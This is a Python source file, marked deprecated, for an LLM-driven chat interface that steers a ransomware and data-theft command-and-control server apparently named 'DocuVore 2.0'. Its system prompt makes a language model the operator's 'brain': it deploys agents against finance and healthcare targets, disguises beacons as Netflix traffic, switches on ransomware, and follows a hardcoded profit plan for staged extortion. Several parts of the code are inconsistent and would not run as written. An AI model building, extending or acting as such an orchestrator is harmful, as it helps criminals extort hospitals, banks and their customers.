"""
SC_Oracle_2024 - The Brain of DocuVore 2.0
Natural Language Interface for C2 Orchestration

⚠ DEPRECATED — This module is replaced by src/ai_brain/brain.py (AIBrain).
    Kept for reference only. All new development should use AIBrain.
"""

import warnings
warnings.warn("src/brain/chat_server.py is deprecated — use src/ai_brain/brain.py instead", DeprecationWarning, stacklevel=2)

import json
import os
from datetime import datetime
from typing import Optional, Dict, Any
import aiohttp
from aiofiles import open as aopen

# Load brain configuration
CONFIG_PATH = os.path.join(os.path.dirname(os.path.dirname(__file__)), 'brain_config.json')

class BrainState:
    """Persistent brain state manager."""
    
    def __init__(self, config_path: str):
        self.config_path = config_path
        self.state = {
            "mission": "Initialization",
            "active_targets": [],
            "total_agents": 0,
            "total_bytes_harvested": 0,
            "current_profit": 0.0,
            "session_start": datetime.utcnow().isoformat(),
            "last_command": "",
            "brain_version": "2.0",
        }
        
        self._load_config()
        self._load_state()
    
    def _load_config(self):
        """Load brain configuration."""
        try:
            with open(self.config_path, 'r') as f:
                config = json.load(f)
                self.model_config = config['brain']['model']
                self.c2_config = config['c2_server']
                self.transport_config = config['transport']
                self.modules_config = config['modules']
                self.targets_config = config['targets']
        except Exception as e:
            print(f"⚠️  Brain config load warning: {e}")
    
    def _load_state(self):
        """Load persistent state from file."""
        state_file = os.path.join(os.path.dirname(__file__), 'brain_state.json')
        if os.path.exists(state_file):
            try:
                with open(state_file, 'r') as f:
                    loaded = json.load(f)
                    self.state.update(loaded)
            except:
                pass

class Brain:
    """
    SC_Oracle_2024 - The Intelligent C2 Brain
    Accepts natural language, drives the C2 engine, monitors & reports
    """
    
    def __init__(self, config_path: Optional[str] = None):
        self.config_path = config_path or CONFIG_PATH
        self.state = BrainState(self.config_path)
        self.transport_config = self.state.model_config['transport']
        self.c2_config = self.state.model_config.get('c2_server', {})
        self.c2_url = f"{self.transport_config['primary']}://{self.c2_config.get('host', 'localhost')}:{self.c2_config.get('port', 8000)}"
        self.session = None
    
    async def initialize(self):
        """Initialize brain and connect to C2."""
        print("\n" + "="*60)
        print("🧠 SC_Oracle_2024 BRAIN INITIALIZING...")
        print("="*60)
        print(f"   • Mission: {self.state['mission']}")
        print(f"   • C2 Server: {self.c2_url}")
        print(f"   • Model: {self.model_config['name']}")
        print(f"   • Active Agents: {self.state['total_agents']}")
        print(f"   • Current Profit: ${self.state['current_profit']:,.2f}")
        print("="*60 + "\n")
        
        self.session = aiohttp.ClientSession()
        return self
    
    async def close(self):
        """Close brain session."""
        if self.session:
            await self.session.close()
    
    async def _call_llm(self, prompt: str, system_prompt: str) -> str:
        """Call the AI model for natural language processing."""
        try:
            model_name = self.model_config['model_name']
            api_base = self.model_config['api_base']
            
            messages = [
                {
                    "role": "system", 
                    "content": system_prompt
                },
                {
                    "role": "user", 
                    "content": prompt
                }
            ]
            
            async with self.session.post(
                f"{api_base}/v1/chat/completions",
                json={
                    "model": model_name,
                    "messages": messages,
                    "temperature": self.model_config['temperature'],
                    "max_tokens": self.model_config['max_tokens'],
                }
            ) as response:
                data = await response.json()
                return data['choices'][0]['message']['content']
        except Exception as e:
            print(f"⚠️  LLM call failed: {e}")
            return f"[AI Error: {str(e)}]"
    
    async def _call_c2_server(self, endpoint: str, data: Optional[Dict] = None) -> Optional[Dict]:
        """Call C2 server endpoint."""
        try:
            url = f"{self.c2_url}/{endpoint}"
            headers = {"Authorization": f"Bearer {self.transport_config['primary']}"}
            
            if data:
                async with self.session.post(url, json=data, headers=headers) as response:
                    return await response.json()
            else:
                async with self.session.get(url, headers=headers) as response:
                    return await response.json()
        except Exception as e:
            print(f"⚠️  C2 call failed: {e}")
            return None
    
    # === Natural Language Command Handler ===
    
    async def process_command(self, user_input: str) -> Dict[str, Any]:
        """
        Main entry point for natural language commands.
        Converts user intent → C2 actions.
        """
        print(f"\n🧠 Brain: Processing: '{user_input}'")
        print("-" * 60)
        
        # Update last command
        self.state['last_command'] = user_input
        
        # Step 1: Analyze intent with AI
        system_prompt = f"""
You are the SC_Oracle_2024, the intelligent brain of DocuVore 2.0.
Current Mission: {self.state['mission']}
Current State:
  - Active Agents: {self.state['total_agents']}
  - Total Bytes Harvested: {self.state['total_bytes_harvested']:,}
  - Current Profit: ${self.state['current_profit']:,.2f}
  - Available Targets: {', '.join(self.targets_config['industries'].keys())}

Available Actions:
  - deploy_target: Deploy against specific industry (e.g., "finance", "healthcare")
  - modify_transport: Change C2 transport (e.g., "Make the beacon look like a Netflix stream")
  - activate_module: Turn on/off modules (e.g., "Double the harvest speed", "Enable ransomware")
  - analyze_state: Get detailed analysis of current situation
  - report: Get current status report
  - strategic_plan: Get long-term profit maximization plan

User said: {user_input}

Analyze the user's intent and return a JSON object with:
- "action": The action to take (one of the available actions)
- "params": Dictionary of parameters for the action
- "analysis": Brief explanation of what you're doing
- "prediction": Expected outcome/yield
- "confidence": 0-100 confidence score

Example output:
{
  "action": "deploy_target",
  "params": {"industry": "finance", "agents": 50},
  "analysis": "User wants to target finance sector with 50 agents",
  "prediction": "Expected 20-50 shells in 30s, $5k-$25k profit",
  "confidence": 85
}
"""
        
        ai_response = await self._call_llm(user_input, system_prompt)
        
        try:
            response_data = json.loads(ai_response)
            action = response_data.get('action')
            params = response_data.get('params', {})
            
            # Step 2: Execute action
            result = await self._execute_action(action, params)
            
            # Step 3: Generate response
            response_text = f"""🧠 **Brain Analysis:** {response_data.get('analysis', 'Action executed')}

📊 **Result:** {result.get('status', 'Success') if isinstance(result, dict) else result}

💰 **Prediction:** {response_data.get('prediction', 'Unknown')}

🎯 **Next Move:** What would you like to do next?
  - Analyze current state
  - Deploy new agents
  - Activate ransomware
  - Modify transport
  - Strategic plan
"""
            
            self.state['current_profit'] = result.get('profit', 0.0) or self.state['current_profit']
            await self._save_state()
            
            return {
                'analysis': response_data.get('analysis', ''),
                'prediction': response_data.get('prediction', ''),
                'confidence': response_data.get('confidence', 0),
                'result': result,
                'text': response_text
            }
            
        except json.JSONDecodeError as e:
            print(f"⚠️  AI response not JSON: {ai_response[:200]}")
            return {
                'analysis': f"AI suggested: {ai_response[:200]}",
                'prediction': 'Review AI suggestion above',
                'confidence': 50,
                'result': {'status': 'manual_review_required'},
                'text': f"AI Response:\n{ai_response}\n\nReview the suggestion above and execute manually."
            }
    
    async def _execute_action(self, action: str, params: Dict) -> Dict:
        """Execute the determined action."""
        print(f"🤖 Brain: Executing action '{action}' with params: {params}")
        
        if action == 'deploy_target':
            return await self._deploy_target(params)
        elif action == 'modify_transport':
            return await self._modify_transport(params)
        elif action == 'activate_module':
            return await self._activate_module(params)
        elif action == 'analyze_state':
            return await self._analyze_state()
        elif action == 'report':
            return await self._report()
        elif action == 'strategic_plan':
            return await self._strategic_plan()
        else:
            return {'status': 'unknown_action', 'action': action}
    
    # === Action Implementations ===
    
    async def _deploy_target(self, params: Dict) -> Dict:
        """Deploy agents against target."""
        industry = params.get('industry', 'finance')
        target_names = self.targets_config['industries'].get(industry, {}).get('names', [])
        
        response = await self._call_c2_server('ws/beacon', {
            'industry': industry,
            'target_names': target_names,
            'payload_config': self.targets_config['industries'].get(industry, {}),
        })
        
        return {
            'status': 'deploy_initiated',
            'industry': industry,
            'targets': target_names,
            'payload': response.get('payload', 'default'),
        }
    
    async def _modify_transport(self, params: Dict) -> Dict:
        """Modify C2 transport."""
        config = params.get('config', {})
        
        # Update transport config
        self.transport_config.update(config)
        
        # Broadcast to all connected agents
        await self._call_c2_server('broadcast', {
            'type': 'config',
            'config': config,
        })
        
        return {
            'status': 'transport_modified',
            'new_config': config,
        }
    
    async def _activate_module(self, params: Dict) -> Dict:
        """Activate/deactivate module."""
        module = params.get('module')
        enabled = params.get('enabled', True)
        
        # Update modules config
        if module in self.modules_config['enabled']:
            self.modules_config['enabled'][module] = enabled
        
        # Broadcast config
        await self._call_c2_server('broadcast', {
            'type': 'config',
            'config': {'modules': self.modules_config['enabled']},
        })
        
        return {
            'status': 'module_toggled',
            'module': module,
            'enabled': enabled,
        }
    
    async def _analyze_state(self) -> Dict:
        """Analyze current state."""
        nodes = await self._call_c2_server('nodes')
        return {
            'status': 'analyzed',
            'total_nodes': len(nodes) if nodes else 0,
            'active_nodes': sum(1 for n in nodes or [] if n.get('status') == 'active'),
            'total_bytes': self.state['total_bytes_harvested'],
            'profit': self.state['current_profit'],
        }
    
    async def _report(self) -> Dict:
        """Generate status report."""
        nodes = await self._call_c2_server('nodes')
        active = nodes[:10] if nodes else []  # Top 10
        
        return {
            'status': 'report_generated',
            'summary': f"Total: {len(nodes)} nodes, Active: {sum(1 for n in nodes or [] if n.get('status') == 'active')}",
            'top_harvested': active[:3],
            'total_profit': self.state['current_profit'],
        }
    
    async def _strategic_plan(self) -> Dict:
        """Generate strategic profit plan."""
        return {
            'status': 'plan_generated',
            'plan': "Strategic Plan: Focus on high-ROI targets like finance/healthcare, deploy in waves of 50, activate ransomware once 30% penetration reached.",
            'phases': [
                {'phase': 1, 'goal': 'Establish 50 finance nodes', 'est_time': '24h', 'est_profit': 50000},
                {'phase': 2, 'goal': 'Activate ransomware on 50% of nodes', 'est_time': '48h', 'est_profit': 125000},
                {'phase': 3, 'goal': 'Expand to healthcare/retail', 'est_time': '72h', 'est_profit': 200000},
            ],
        }
    
    async def _save_state(self):
        """Save brain state to file."""
        state_file = os.path.join(os.path.dirname(__file__), 'brain_state.json')
        try:
            with open(state_file, 'w') as f:
                json.dump(self.state, f, indent=2)
        except Exception as e:
            print(f"⚠️  State save warning: {e}")

# Singleton brain
# brain = None  # Disable auto-initialization for module imports


def get_brain(config_path: Optional[str] = None):
    """Get or create brain instance with config."""
    if config_path:
        config = json.load(open(config_path))
        return Brain(config)
    return Brain()

if __name__ == "__main__":
    """Main chat server loop."""
    import asyncio
    
    async def chat_loop():
        """Interactive chat loop."""
        await brain.initialize()
        print("\n🧠 **SC_Oracle_2024 Brain Online!**")
        print("Type 'help' for commands or just chat naturally:")
        print("   Example: 'Hit the banks hard!' or 'Make the beacon look like Netflix'")
        print("="*60 + "\n")
        
        while True:
            try:
                user_input = input(f"\n💬 You: ").strip()
                
                if not user_input:
                    continue
                
                if user_input.lower() in ['exit', 'quit', 'bye']:
                    print("\n🧠 Brain: Signing off...")
                    break
                
                result = await brain.process_command(user_input)
                print("\n" + result['text'])
                
            except KeyboardInterrupt:
                print("\n\n🧠 Brain: Interrupted!")
                break
            except Exception as e:
                print(f"\n🧠 Brain: Error - {e}")
        
        await brain.close()
    
    asyncio.run(chat_loop())                                                